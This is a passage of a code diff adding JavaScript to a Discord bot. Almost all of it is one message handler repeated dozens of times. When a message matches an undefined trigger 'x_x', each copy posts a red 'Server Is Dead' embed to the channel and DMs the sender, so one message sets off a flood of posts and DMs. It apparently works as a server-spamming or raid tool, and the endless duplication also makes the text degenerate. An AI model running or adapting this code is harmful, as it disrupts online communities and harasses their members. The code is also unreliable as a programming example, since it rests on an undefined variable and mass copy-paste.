+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
